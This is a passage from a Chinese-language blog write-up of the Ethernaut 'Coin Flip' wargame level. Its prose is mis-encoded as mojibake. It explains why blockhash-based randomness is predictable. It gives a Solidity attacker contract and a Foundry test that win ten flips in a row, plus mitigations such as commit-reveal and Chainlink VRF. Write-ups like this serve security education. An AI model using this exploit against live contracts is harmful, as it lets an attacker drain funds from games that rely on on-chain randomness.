class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract CommitRevealCoinFlip &#123;</span><br><span class=\"line\">    struct Game &#123;</span><br><span class=\"line\">        bytes32 commitment;</span><br><span class=\"line\">        uint256 revealBlock;</span><br><span class=\"line\">        bool revealed;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    mapping(address =&gt; Game) public games;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function commitFlip(bytes32 _commitment) public &#123;</span><br><span class=\"line\">        games[msg.sender] = Game(&#123;</span><br><span class=\"line\">            commitment: _commitment,</span><br><span class=\"line\">            revealBlock: block.number + 10, // 10ä¸ªåŒºå—åæ‰èƒ½æ­ç¤º</span><br><span class=\"line\">            revealed: false</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function revealFlip(bool _guess, uint256 _nonce) public &#123;</span><br><span class=\"line\">        Game storage game = games[msg.sender];</span><br><span class=\"line\">        </span><br><span class=\"line\">        require(block.number &gt;= game.revealBlock, &quot;Too early to reveal&quot;);</span><br><span class=\"line\">        require(!game.revealed, &quot;Already revealed&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯æ‰¿è¯º</span><br><span class=\"line\">        bytes32 hash = keccak256(abi.encodePacked(_guess, _nonce, msg.sender));</span><br><span class=\"line\">        require(hash == game.commitment, &quot;Invalid commitment&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ä½¿ç”¨æœªæ¥åŒºå—å“ˆå¸Œ</span><br><span class=\"line\">        uint256 futureBlockHash = uint256(blockhash(game.revealBlock));</span><br><span class=\"line\">        bool result = (futureBlockHash % 2) == 1;</span><br><span class=\"line\">        </span><br><span class=\"line\">        game.revealed = true;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // å¤„ç†ç»“æœ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-å¤šæºç†µç»„åˆ\"><a href=\"#3-å¤šæºç†µç»„åˆ\" class=\"headerlink\" title=\"3. å¤šæºç†µç»„åˆ\"></a>3. å¤šæºç†µç»„åˆ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract MultiSourceRandom &#123;</span><br><span class=\"line\">    uint256 private nonce;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function getRandomNumber() private returns (uint256) &#123;</span><br><span class=\"line\">        // âš ï¸ ä»ä¸å¤Ÿå®‰å…¨ï¼Œä»…ä½œæ•™å­¦ç¤ºä¾‹</span><br><span class=\"line\">        nonce++;</span><br><span class=\"line\">        return uint256(keccak256(abi.encodePacked(</span><br><span class=\"line\">            block.difficulty,    // çŸ¿å·¥å¯æ“æ§</span><br><span class=\"line\">            block.timestamp,     // çŸ¿å·¥å¯å°å¹…æ“æ§</span><br><span class=\"line\">            msg.sender,</span><br><span class=\"line\">            nonce,</span><br><span class=\"line\">            blockhash(block.number - 1)</span><br><span class=\"line\">        )));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\"><a href=\"#ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\" class=\"headerlink\" title=\"ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\"></a>ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹</h2><h3 id=\"1-åŒºå—é“¾éšæœºæ•°å¸¸è§è¯¯åŒº\"><a href=\"#1-åŒºå—é“¾éšæœºæ•°å¸¸è§è¯¯åŒº\" class=\"headerlink\" title=\"1. åŒºå—é“¾éšæœºæ•°å¸¸è§è¯¯åŒº\"></a>1. åŒºå—é“¾éšæœºæ•°å¸¸è§è¯¯åŒº</h3><table>\n<thead>\n<tr>\n<th>æ•°æ®æº</th>\n<th>å®‰å…¨æ€§</th>\n<th>æ“æ§éš¾åº¦</th>\n<th>æ¨èä½¿ç”¨</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>block.timestamp</code></td>\n<td>âŒ æä½</td>\n<td>å®¹æ˜“</td>\n<td>å¦</td>\n</tr>\n<tr>\n<td><code>block.difficulty</code></td>\n<td>âŒ ä½</td>\n<td>ä¸­ç­‰</td>\n<td>å¦</td>\n</tr>\n<tr>\n<td><code>blockhash</code></td>\n<td>âŒ ä½</td>\n<td>å›°éš¾</td>\n<td>å¦</td>\n</tr>\n<tr>\n<td><code>keccak256(ç»„åˆ)</code></td>\n<td>âŒ ä½</td>\n<td>å–å†³äºç»„åˆ</td>\n<td>å¦</td>\n</tr>\n<tr>\n<td><strong>Chainlink VRF</strong></td>\n<td>âœ… é«˜</td>\n<td>æå›°éš¾</td>\n<td><strong>æ˜¯</strong></td>\n</tr>\n</tbody></table>\n<h3 id=\"2-æ”»å‡»è€…çš„ä¼˜åŠ¿\"><a href=\"#2-æ”»å‡»è€…çš„ä¼˜åŠ¿\" class=\"headerlink\" title=\"2. æ”»å‡»è€…çš„ä¼˜åŠ¿\"></a>2. æ”»å‡»è€…çš„ä¼˜åŠ¿</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// æ”»å‡»è€…å¯ä»¥ï¼š</span><br><span class=\"line\">// 1. åœ¨åŒä¸€äº¤æ˜“ä¸­æ‰§è¡Œç›¸åŒè®¡ç®—</span><br><span class=\"line\">// 2. é¢„å…ˆéªŒè¯ç»“æœï¼Œåªåœ¨æœ‰åˆ©æ—¶æäº¤</span><br><span class=\"line\">// 3. ä½¿ç”¨åˆçº¦è‡ªåŠ¨åŒ–æ”»å‡»</span><br><span class=\"line\"></span><br><span class=\"line\">contract SmartAttacker &#123;</span><br><span class=\"line\">    function conditionalAttack(CoinFlip target, bool guess) public &#123;</span><br><span class=\"line\">        // é¢„å…ˆè®¡ç®—</span><br><span class=\"line\">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class=\"line\">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class=\"line\">        bool predictedSide = coinFlip == 1 ? true : false;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // åªåœ¨é¢„æµ‹æ­£ç¡®æ—¶æ‰æ”»å‡»</span><br><span class=\"line\">        if (predictedSide == guess) &#123;</span><br><span class=\"line\">            target.flip(guess);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        // å¦åˆ™ä»€ä¹ˆéƒ½ä¸åšï¼Œç­‰å¾…ä¸‹ä¸€ä¸ªæœ‰åˆ©æœºä¼š</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-çœŸéšæœºæ•°-vs-ä¼ªéšæœºæ•°\"><a href=\"#3-çœŸéšæœºæ•°-vs-ä¼ªéšæœºæ•°\" class=\"headerlink\" title=\"3. çœŸéšæœºæ•° vs ä¼ªéšæœºæ•°\"></a>3. çœŸéšæœºæ•° vs ä¼ªéšæœºæ•°</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// âŒ ä¼ªéšæœºæ•°ï¼ˆç¡®å®šæ€§ï¼‰</span><br><span class=\"line\">function badRandom() public view returns (uint256) &#123;</span><br><span class=\"line\">    return uint256(keccak256(abi.encodePacked(</span><br><span class=\"line\">        block.timestamp,</span><br><span class=\"line\">        block.difficulty,</span><br><span class=\"line\">        msg.sender</span><br><span class=\"line\">    )));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// âœ… çœŸéšæœºæ•°ï¼ˆä½¿ç”¨é¢„è¨€æœºï¼‰</span><br><span class=\"line\">function goodRandom() public &#123;</span><br><span class=\"line\">    // é€šè¿‡ Chainlink VRF è¯·æ±‚çœŸæ­£çš„éšæœºæ•°</span><br><span class=\"line\">    requestRandomness(keyHash, fee);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›ï¸-å†å²æ¡ˆä¾‹\"><a href=\"#ğŸ›ï¸-å†å²æ¡ˆä¾‹\" class=\"headerlink\" title=\"ğŸ›ï¸ å†å²æ¡ˆä¾‹\"></a>ğŸ›ï¸ å†å²æ¡ˆä¾‹</h2><h3 id=\"è‘—åçš„éšæœºæ•°æ”»å‡»äº‹ä»¶\"><a href=\"#è‘—åçš„éšæœºæ•°æ”»å‡»äº‹ä»¶\" class=\"headerlink\" title=\"è‘—åçš„éšæœºæ•°æ”»å‡»äº‹ä»¶\"></a>è‘—åçš„éšæœºæ•°æ”»å‡»äº‹ä»¶</h3><ol>\n<li><p><strong>SmartBillions</strong> (2017)</p>\n<ul>\n<li>æŸå¤±: 400 ETH</li>\n<li>åŸå› : ä½¿ç”¨ <code>block.blockhash</code> ä½œä¸ºéšæœºæº</li>\n<li>æ”»å‡»: é¢„æµ‹æœªæ¥åŒºå—å“ˆå¸Œ</li>\n</ul>\n</li>\n<li><p><strong>Fomo3D</strong> (2018)</p>\n<ul>\n<li>å½±å“: æ¸¸æˆæœºåˆ¶è¢«æ“æ§</li>\n<li>åŸå› : ä½¿ç”¨å¯é¢„æµ‹çš„æ—¶é—´æˆ³</li>\n<li>åæœ: å¥–æ± åˆ†é…ä¸å…¬</li>\n</ul>\n</li>\n<li><p><strong>TheRun</strong> (2019)</p>\n<ul>\n<li>æŸå¤±: å¤§é‡ä»£å¸</li>\n<li>åŸå› : å¤æ‚ä½†ä»å¯é¢„æµ‹çš„éšæœºæ•°ç®—æ³•</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p>Coin Flip å…³å¡æ­ç¤ºäº†åŒºå—é“¾éšæœºæ•°çš„æ ¹æœ¬é—®é¢˜ï¼š</p>\n<ul>\n<li>âœ… <strong>åŒºå—é“¾æ˜¯ç¡®å®šæ€§ç³»ç»Ÿ</strong> - ç›¸åŒè¾“å…¥å¿…ç„¶äº§ç”Ÿç›¸åŒè¾“å‡º</li>\n<li>âœ… <strong>é€æ˜æ€§å¸¦æ¥å¯é¢„æµ‹æ€§</strong> - æ‰€æœ‰æ•°æ®éƒ½æ˜¯å…¬å¼€çš„</li>\n<li>âœ… <strong>çœŸéšæœºæ•°éœ€è¦å¤–éƒ¨ç†µæº</strong> - å¿…é¡»ä¾èµ–é“¾ä¸‹éšæœºæ€§</li>\n<li>âœ… <strong>é¢„è¨€æœºæ˜¯æœ€ä½³è§£å†³æ–¹æ¡ˆ</strong> - Chainlink VRF ç­‰æœåŠ¡</li>\n</ul>\n<p>è¿™ä¸ªçœ‹ä¼¼ç®€å•çš„çŒœç¡¬å¸æ¸¸æˆï¼Œå®é™…ä¸Šæ¶‰åŠå¯†ç å­¦ã€æ¦‚ç‡è®ºå’Œåˆ†å¸ƒå¼ç³»ç»Ÿçš„æ·±å±‚æ¦‚å¿µã€‚ç†è§£å…¶åŸç†å¯¹äºæ„å»ºå®‰å…¨çš„æ™ºèƒ½åˆçº¦è‡³å…³é‡è¦ã€‚</p>\n<hr>\n<h2 id=\"ğŸ”—-ç›¸å…³é“¾æ¥\"><a href=\"#ğŸ”—-ç›¸å…³é“¾æ¥\" class=\"headerlink\" title=\"ğŸ”— ç›¸å…³é“¾æ¥\"></a>ğŸ”— ç›¸å…³é“¾æ¥</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-02-fallout/\">ä¸Šä¸€å…³: Level 2 - Fallout</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-04-telephone/\">ä¸‹ä¸€å…³: Level 4 - Telephone</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://docs.chain.link/vrf/v2/introduction\">Chainlink VRF æ–‡æ¡£</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub é¡¹ç›®</a></strong></li>\n</ul>\n<hr>\n<p><em>åœ¨åŒºå—é“¾çš„ç¡®å®šæ€§ä¸–ç•Œä¸­ï¼ŒçœŸæ­£çš„éšæœºæ€§æ˜¯ä¸€ç§çè´µçš„èµ„æºã€‚</em> ğŸ²</p>\n","more":"<h1 id=\"ğŸ¯-Ethernaut-Level-3-Coin-Flip-ä¼ªéšæœºæ•°æ”»å‡»è¯¦è§£\"><a href=\"#ğŸ¯-Ethernaut-Level-3-Coin-Flip-ä¼ªéšæœºæ•°æ”»å‡»è¯¦è§£\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 3: Coin Flip - ä¼ªéšæœºæ•°æ”»å‡»è¯¦è§£\"></a>ğŸ¯ Ethernaut Level 3: Coin Flip - ä¼ªéšæœºæ•°æ”»å‡»è¯¦è§£</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/3\">Ethernaut Level 3 - Coin Flip</a><br><strong>æ”»å‡»ç±»å‹</strong>: ä¼ªéšæœºæ•°é¢„æµ‹æ”»å‡»<br><strong>éš¾åº¦</strong>: â­â­â­â˜†â˜†<br><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>: åŒºå—é“¾ç¡®å®šæ€§ã€å¯é¢„æµ‹æ€§</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>è¿™ä¸ªå…³å¡è€ƒéªŒå¯¹åŒºå—é“¾éšæœºæ•°æœºåˆ¶çš„ç†è§£ï¼š</p>\n<ol>\n<li><strong>è¿ç»­çŒœå¯¹10æ¬¡</strong> - è¿ç»­æ­£ç¡®é¢„æµ‹ç¡¬å¸æ­£åé¢</li>\n<li><strong>ç†è§£ä¼ªéšæœºæ•°</strong> - æŒæ¡åŒºå—é“¾â€éšæœºæ•°â€çš„æœ¬è´¨</li>\n<li><strong>å­¦ä¹ é¢„æµ‹æŠ€æœ¯</strong> - åˆ©ç”¨åŒºå—é“¾çš„ç¡®å®šæ€§è¿›è¡Œæ”»å‡»</li>\n</ol>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><h3 id=\"åˆçº¦æºç åˆ†æ\"><a href=\"#åˆçº¦æºç åˆ†æ\" class=\"headerlink\" title=\"åˆçº¦æºç åˆ†æ\"></a>åˆçº¦æºç åˆ†æ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract CoinFlip &#123;</span><br><span class=\"line\">  uint256 public consecutiveWins;</span><br><span class=\"line\">  uint256 lastHash;</span><br><span class=\"line\">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class=\"line\"></span><br><span class=\"line\">  constructor() &#123;</span><br><span class=\"line\">    consecutiveWins = 0;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class=\"line\">    // ğŸš¨ å…³é”®æ¼æ´ï¼šä½¿ç”¨å¯é¢„æµ‹çš„åŒºå—å“ˆå¸Œ</span><br><span class=\"line\">    uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class=\"line\">    </span><br><span class=\"line\">    if (lastHash == blockValue) &#123;</span><br><span class=\"line\">      revert();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    lastHash = blockValue;</span><br><span class=\"line\">    // ğŸš¨ ä¼ªéšæœºæ•°ç”Ÿæˆé€»è¾‘</span><br><span class=\"line\">    uint256 coinFlip = blockValue / FACTOR;</span><br><span class=\"line\">    bool side = coinFlip == 1 ? true : false;</span><br><span class=\"line\"></span><br><span class=\"line\">    if (side == _guess) &#123;</span><br><span class=\"line\">      consecutiveWins++;</span><br><span class=\"line\">      return true;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">      consecutiveWins = 0;</span><br><span class=\"line\">      return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ¼æ´è¯†åˆ«\"><a href=\"#æ¼æ´è¯†åˆ«\" class=\"headerlink\" title=\"æ¼æ´è¯†åˆ«\"></a>æ¼æ´è¯†åˆ«</h3><p><strong>ä¼ªéšæœºæ•°çš„æ ¹æœ¬ç¼ºé™·</strong>ï¼š</p>\n<ol>\n<li><strong>æ•°æ®æºå¯é¢„æµ‹</strong> - <code>blockhash(block.number - 1)</code> æ˜¯å…¬å¼€å¯æŸ¥çš„</li>\n<li><strong>ç®—æ³•é€æ˜</strong> - éšæœºæ•°ç”Ÿæˆç®—æ³•å®Œå…¨å…¬å¼€</li>\n<li><strong>ç¡®å®šæ€§è®¡ç®—</strong> - ç›¸åŒè¾“å…¥å¿…ç„¶äº§ç”Ÿç›¸åŒè¾“å‡º</li>\n</ol>\n<p><strong>æ”»å‡»åŸç†</strong>ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// åˆçº¦ä½¿ç”¨çš„&quot;éšæœºæ•°&quot;ç”Ÿæˆ</span><br><span class=\"line\">uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class=\"line\">uint256 coinFlip = blockValue / FACTOR;</span><br><span class=\"line\">bool side = coinFlip == 1 ? true : false;</span><br><span class=\"line\"></span><br><span class=\"line\">// æ”»å‡»è€…å¯ä»¥åœ¨åŒä¸€ä¸ªåŒºå—å†…æ‰§è¡Œç›¸åŒè®¡ç®—</span><br><span class=\"line\">// ç”±äºä½¿ç”¨ç›¸åŒçš„ blockhashï¼Œç»“æœå¿…ç„¶ç›¸åŒï¼</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ”»å‡»æµç¨‹\"><a href=\"#æ”»å‡»æµç¨‹\" class=\"headerlink\" title=\"æ”»å‡»æµç¨‹\"></a>æ”»å‡»æµç¨‹</h3><ol>\n<li><strong>è·å–å½“å‰åŒºå—å“ˆå¸Œ</strong> - è¯»å– <code>blockhash(block.number - 1)</code></li>\n<li><strong>æ‰§è¡Œç›¸åŒè®¡ç®—</strong> - ä½¿ç”¨ç›¸åŒçš„ç®—æ³•è®¡ç®—ç»“æœ</li>\n<li><strong>æå‰çŸ¥é“ç­”æ¡ˆ</strong> - åœ¨è°ƒç”¨ <code>flip()</code> å‰å°±çŸ¥é“æ­£ç¡®ç­”æ¡ˆ</li>\n<li><strong>æäº¤æ­£ç¡®çŒœæµ‹</strong> - ä¿è¯100%èƒœç‡</li>\n</ol>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/CoinFlip.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract CoinFlipAttacker &#123;</span><br><span class=\"line\">    CoinFlip public target;</span><br><span class=\"line\">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(address _target) &#123;</span><br><span class=\"line\">        target = CoinFlip(_target);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function attack() public &#123;</span><br><span class=\"line\">        // ğŸ¯ å…³é”®ï¼šåœ¨åŒä¸€åŒºå—å†…æ‰§è¡Œç›¸åŒçš„è®¡ç®—</span><br><span class=\"line\">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class=\"line\">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class=\"line\">        bool side = coinFlip == 1 ? true : false;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æäº¤é¢„å…ˆè®¡ç®—å¥½çš„ç­”æ¡ˆ</span><br><span class=\"line\">        target.flip(side);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract CoinFlipTest is Test &#123;</span><br><span class=\"line\">    CoinFlip public coinFlip;</span><br><span class=\"line\">    CoinFlipAttacker public attacker;</span><br><span class=\"line\">    </span><br><span class=\"line\">    address public attackerAddr = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // éƒ¨ç½²ç›®æ ‡åˆçº¦</span><br><span class=\"line\">        coinFlip = new CoinFlip();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éƒ¨ç½²æ”»å‡»åˆçº¦</span><br><span class=\"line\">        vm.prank(attackerAddr);</span><br><span class=\"line\">        attacker = new CoinFlipAttacker(address(coinFlip));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testCoinFlipExploit() public &#123;</span><br><span class=\"line\">        console.log(&quot;Initial consecutive wins:&quot;, coinFlip.consecutiveWins());</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(attackerAddr);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // è¿ç»­æ”»å‡»10æ¬¡ä»¥è·å¾—10è¿èƒœ</span><br><span class=\"line\">        for (uint i = 0; i &lt; 10; i++) &#123;</span><br><span class=\"line\">            // æ¨¡æ‹Ÿæ–°åŒºå—ï¼ˆæ¯æ¬¡æ”»å‡»éƒ½åœ¨æ–°åŒºå—è¿›è¡Œï¼‰</span><br><span class=\"line\">            vm.roll(block.number + 1);</span><br><span class=\"line\">            </span><br><span class=\"line\">            uint256 winsBefore = coinFlip.consecutiveWins();</span><br><span class=\"line\">            attacker.attack();</span><br><span class=\"line\">            uint256 winsAfter = coinFlip.consecutiveWins();</span><br><span class=\"line\">            </span><br><span class=\"line\">            console.log(&quot;Round&quot;, i + 1, &quot;- Wins:&quot;, winsAfter);</span><br><span class=\"line\">            </span><br><span class=\"line\">            // éªŒè¯æ¯æ¬¡æ”»å‡»éƒ½æˆåŠŸ</span><br><span class=\"line\">            assertEq(winsAfter, winsBefore + 1);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯æœ€ç»ˆè¾¾æˆ10è¿èƒœ</span><br><span class=\"line\">        assertEq(coinFlip.consecutiveWins(), 10);</span><br><span class=\"line\">        console.log(&quot;Attack successful! 10 consecutive wins achieved.&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testPredictability() public view &#123;</span><br><span class=\"line\">        // æ¼”ç¤ºéšæœºæ•°çš„å¯é¢„æµ‹æ€§</span><br><span class=\"line\">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class=\"line\">        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class=\"line\">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class=\"line\">        bool side = coinFlip == 1 ? true : false;</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;Block hash:&quot;, blockValue);</span><br><span class=\"line\">        console.log(&quot;Coin flip result:&quot;, side);</span><br><span class=\"line\">        console.log(&quot;This result is 100% predictable!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"è¿è¡Œæµ‹è¯•\"><a href=\"#è¿è¡Œæµ‹è¯•\" class=\"headerlink\" title=\"è¿è¡Œæµ‹è¯•\"></a>è¿è¡Œæµ‹è¯•</h3><figure class=\"highlight 